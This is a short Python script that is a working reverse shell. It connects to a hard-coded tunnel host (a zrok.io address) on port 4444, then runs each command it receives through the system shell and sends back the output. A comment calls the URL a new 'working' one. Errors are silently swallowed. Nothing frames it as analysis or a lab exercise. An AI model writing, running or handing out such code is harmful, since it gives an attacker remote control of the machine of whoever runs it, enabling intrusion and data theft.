import socket, os, subprocess
# Tera naya working URL
LHOST = "8by9xh7xokzd.share.zrok.io"
LPORT = 4444
def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((LHOST, LPORT))
        s.send(b"[*] Target Connected!\n")
        while True:
            data = s.recv(1024).decode("utf-8")
            if data.strip() == "exit": break
            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(proc.stdout.read() + proc.stderr.read())
    except: pass
    finally: s.close()
connect()
